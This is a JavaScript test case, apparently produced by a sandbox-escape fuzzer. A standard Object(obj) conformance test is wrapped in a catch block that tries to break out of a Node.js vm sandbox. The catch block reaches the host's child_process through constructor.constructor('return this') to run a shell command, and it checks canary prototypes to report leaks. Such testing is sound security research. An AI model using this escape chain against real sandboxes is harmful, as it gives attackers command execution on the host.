try {
    function MyObject(val) {
        throw () => {
            return () => {
            };
        };
        this.value = val;
        this.valueOf = function () {
            return this.value;
        };
    }
    var x = new MyObject(1);
    var y = Object(x);
    if (y.valueOf() !== x.valueOf()) {
        $ERROR('#1: Object(obj).valueOf() === obj.valueOf(). Actual: ' + Object(obj).valueOf());
    }
    if (typeof y !== typeof x) {
        $ERROR('#2: typeof Object(obj) === typeof obj. Actual: ' + typeof Object(obj));
    }
    if (y.constructor.prototype !== x.constructor.prototype) {
        $ERROR('#3: Object(obj).constructor.prototype === obj.constructor.prototype. Actual: ' + Object(obj).constructor.prototype);
    }
    if (y !== x) {
        $ERROR('#4: Object(obj) === obj');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}